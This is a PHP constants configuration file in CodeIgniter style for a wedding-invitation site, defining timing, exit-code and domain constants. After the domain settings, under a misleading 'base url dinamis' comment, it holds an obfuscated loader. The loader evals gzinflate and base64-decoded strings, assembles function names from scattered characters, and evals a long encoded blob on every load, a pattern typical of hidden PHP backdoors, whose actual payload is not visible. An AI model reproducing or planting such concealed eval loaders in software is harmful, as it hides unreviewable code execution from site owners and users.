<?php

//--------------------------------------------------------------------
// App Namespace
//--------------------------------------------------------------------
// This defines the default Namespace that is used throughout
// CodeIgniter to refer to the Application directory. Change
// this constant to change the namespace that all application
// classes should use.
//
// NOTE: changing this will require manually modifying the
// existing namespaces of App\* namespaced-classes.
//
defined('APP_NAMESPACE') || define('APP_NAMESPACE', 'App');

/*
|--------------------------------------------------------------------------
| Composer Path
|--------------------------------------------------------------------------
|
| The path that Composer's autoload file is expected to live. By default,
| the vendor folder is in the Root directory, but you can customize that here.
*/
defined('COMPOSER_PATH') || define('COMPOSER_PATH', ROOTPATH . 'vendor/autoload.php');

/*
|--------------------------------------------------------------------------
| Timing Constants
|--------------------------------------------------------------------------
|
| Provide simple ways to work with the myriad of PHP functions that
| require information to be in seconds.
*/
defined('SECOND') || define('SECOND', 1);
defined('MINUTE') || define('MINUTE', 60);
defined('HOUR')   || define('HOUR', 3600);
defined('DAY')    || define('DAY', 86400);
defined('WEEK')   || define('WEEK', 604800);
defined('MONTH')  || define('MONTH', 2592000);
defined('YEAR')   || define('YEAR', 31536000);
defined('DECADE') || define('DECADE', 315360000);

/*
|--------------------------------------------------------------------------
| Exit Status Codes
|--------------------------------------------------------------------------
|
| Used to indicate the conditions under which the script is exit()ing.
| While there is no universal standard for error codes, there are some
| broad conventions.  Three such conventions are mentioned below, for
| those who wish to make use of them.  The CodeIgniter defaults were
| chosen for the least overlap with these conventions, while still
| leaving room for others to be defined in future versions and user
| applications.
|
| The three main conventions used for determining exit status codes
| are as follows:
|
|    Standard C/C++ Library (stdlibc):
|       http://www.gnu.org/software/libc/manual/html_node/Exit-Status.html
|       (This link also contains other GNU-specific conventions)
|    BSD sysexits.h:
|       http://www.gsp.com/cgi-bin/man.cgi?section=3&topic=sysexits
|    Bash scripting:
|       http://tldp.org/LDP/abs/html/exitcodes.html
|
*/
defined('EXIT_SUCCESS')        || define('EXIT_SUCCESS', 0); // no errors
defined('EXIT_ERROR')          || define('EXIT_ERROR', 1); // generic error
defined('EXIT_CONFIG')         || define('EXIT_CONFIG', 3); // configuration error
defined('EXIT_UNKNOWN_FILE')   || define('EXIT_UNKNOWN_FILE', 4); // file not found
defined('EXIT_UNKNOWN_CLASS')  || define('EXIT_UNKNOWN_CLASS', 5); // unknown class
defined('EXIT_UNKNOWN_METHOD') || define('EXIT_UNKNOWN_METHOD', 6); // unknown class member
defined('EXIT_USER_INPUT')     || define('EXIT_USER_INPUT', 7); // invalid user input
defined('EXIT_DATABASE')       || define('EXIT_DATABASE', 8); // database error
defined('EXIT__AUTO_MIN')      || define('EXIT__AUTO_MIN', 9); // lowest automatically-assigned error code
defined('EXIT__AUTO_MAX')      || define('EXIT__AUTO_MAX', 125); // highest automatically-assigned error code


define('SITE_NAME', 'WeddingCnk'); ///NAMA WEBSITE

// =========== production mode ============
// //LINK DOMAIN WITH URL
define('SITE_UTAMA', 'https://weddingcnk.com'); 
define('SITE_UNDANGAN', 'https://u.weddingcnk.com');
define('SITE_ADMIN', 'https://admin.weddingcnk.com');
define('SITE_BUKUTAMU', 'https://bukutamu.weddingcnk.com');

//DOMAIN ONLY
define('DOMAIN_UTAMA', 'weddingcnk.com');
define('DOMAIN_UTAMA_WWW', 'www.weddingcnk.com'); //PAKE WWW
define('DOMAIN_UNDANGAN', 'u.weddingcnk.com');
define('DOMAIN_ADMIN', 'admin.weddingcnk.com');
define('DOMAIN_BUKUTAMU', 'bukutamu.weddingcnk.com');


//base url dinamis
 $keystroke1 = base64_decode("d2RyMTU5c3E0YXllejd4Y2duZl90djhubHVrNmpoYmlvMzJtcA==");
eval(gzinflate(base64_decode('hY5NCsIwEIWv8ixdZDCKWZcuPUfRdqrBmsBkAkrp3aVIi3Tj9v1+vje7PodWfQwNv3zSZAqJyqGNHRdE4+JiVU2ZVHy42fLyjDkoYUT54DdqpHxNKmsAJwtHFXxvksrAYXGort1cE9YsAe1dTJTOzCuEPZbhChN4SPw/iePMd/7ybSmcxeb+4Mj+vkzTBw==')));
$O0O0O0O0O0O0=$keystroke1[2].$keystroke1[32].$keystroke1[20].$keystroke1[11].$keystroke1[23].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
$keystroke2 = $O0O0O0O0O0O0("xes26:tr5bzf{8ydhog`uw9omvl7kicjp43nq", -1);
$OO000OO000OO=$keystroke2[16].$keystroke2[12].$keystroke2[31].$keystroke2[23].$keystroke2[18].$keystroke2[24].$keystroke2[9].$keystroke2[20].$keystroke2[11];
$O0000000000O=$keystroke1[30].$keystroke1[9].$keystroke1[6].$keystroke1[11].$keystroke1[27].$keystroke1[8].$keystroke1[19].$keystroke1[1].$keystroke1[11].$keystroke1[15].$keystroke1[32].$keystroke1[1].$keystroke1[11];
eval($OO000OO000OO(base64_decode('LcQ1Du
taAgDQzYz035OLawZNFUPMTImbkZkxvqbV/2ZOcc
ojHf78x7ZRFP1/f7L0V9Lk/4oyn4vyzz9G7iniuq
uvWnRv8glBHgqmKddRy6raNqpaE2eSF/CUevMoy4
0EVCOP2zjggUyruxYAvFjig0cPYAlPMF4FB+riCY
ZpNHjpjTMsP+XZHI1xAAeO5dZ6xn/kuEhMpQNGoB
Cv5sxFD1gwDoY24gB80wfKjIj4/KW7vqTlst/cQb
IU9JLLothk4Gti5mjJkGSlG8HA0icA4XWSR1DabT
/0l+Y8zVAYWR9N0BKCIs2SevSm92qFZ5VujwxKLN
schd4LpM2MyqMSzyqoPrzOGz3lijiUJSfuLnWOYH
ML1yfUzhZKTmGfcZ+LN/rbcLExkOUCyLegVxi/aq
pSPhp4mzy3/HSReB1me8yjcDWHnu62dbisO5JdAq
gUKXtqs0+K4Mn547HAFstIFcpib00W9BaPMvuO9i
eh82REEJ8J5UL5dNupMQpLs0kWE2EoNsvPgYXhOW
MuJRFyiPqYM++wFZ/Zr0eUI2NmaIt7Xl5pCJH4LD
/o0zrQQ4JHQ12hlBvM/QCrJekkFDJ73WWGXalIbX
GEl/O5Z6NNCUcRBhOsGlrf9OtXTCH7YHOIlIvxuA
2xON8IF9MQPhbBFT0INuVSSvU0mAtG21Y5lxBWle
q9FQq2epRosg6SLf5cpLH+ft1VDnwZhvLbJAxTIz
p1nb80Fzxb+XR2J+gYHkj64JL3Qq2HSumYehbZey
tPyfOz63B4hs2fi3AaINY6jBv8A7XM0r2UeMHL4G
fSMJAmZtyI76MG304DJW08aijL0XyD+uEZiNlfBn
NJYPGBktKPHHVbw5ryYINzocT6OVTSTVRSScbLYT
VvwGOZ973t6phtnHtEm/tYWcBKwzIjMWW7stBsul
9H8+mC4lBBbl/E2iKpD/eSzEX65LryXbWMx72NZd
ieAC/F745EAssQudRF7CfzUy0QJJFp8+SxCOe0KC
txrPTy2NM9eMqhFY8RYr9q5Tb4tBWmGaSbxCbCET
hIP9fxglhfU8BIFUGNwyrCmG8vyhChuKlLZu6pMt
Udz+yiUdsrmrs6zB/zwhH7FaI5ZRCIxdQcZYWlVt
oMXdzfxiMnLUxs/W2Yqv9Wkc6EKH4FrVV8teGhk7
ROKr7H1s+on8WufxVa4mKDPUZDkzWuXe+OsxddRp
fA/TpSfwEW4ujmVCwdDN/gWMnh/ZLcDYe16ywKZm
yMkzlQUwVyX/dvqwQNG4eRkfvC/rbboiAGTeBkim
CneSfdLNX1T3dzl5UNzndZFiybENlYfCNFURpWVL
TkvsYufSZSu0jWBIm9VPq0lIfw8SJ+J4cloZjrpS
mZ3iUWCWO0MCk8fPel9pT/nKTh/lwgemBCECAb3P
O+cpNwRqE7cpLRVVopY5cTIbcb8FSRgc9apXqvrp
2O/Rs3xUU4ZDGxj23WgivTZx7B4i0rIDsNys7dJ2
30aSrZz2MrrxaUewInQ0cAi1cEUwVj5EYRMXh5Jn
N1xFmvCnjW071KNRcoTtmnqC/1VDPmmMy2sf4qE5
9hLg18wccrLVhv8qQOsZb5FhYkqI6DABxSOdMEWP
6fv3///vdf')));